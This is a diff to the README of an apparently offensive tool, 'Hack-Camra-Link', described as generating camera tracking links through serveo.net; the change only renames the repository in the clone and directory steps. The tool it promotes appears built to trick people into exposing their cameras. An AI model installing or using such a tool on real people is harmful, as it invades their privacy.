@@ -11,12 +11,12 @@ A tool to generate camera tracking links using `serveo.net`.
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/MohamedAbuAl-Saud/Hack-Camra-Link.git
+   git clone https://github.com/MohamedAbuAl-Saud/Hack-Camra-Link-DF.git
    ```
 
 2. Navigate to the tool's directory:
    ```bash
-   cd Hack-Camra-Link
+   cd Hack-Camra-Link-DF
    ```
 
 3. Run the tool:
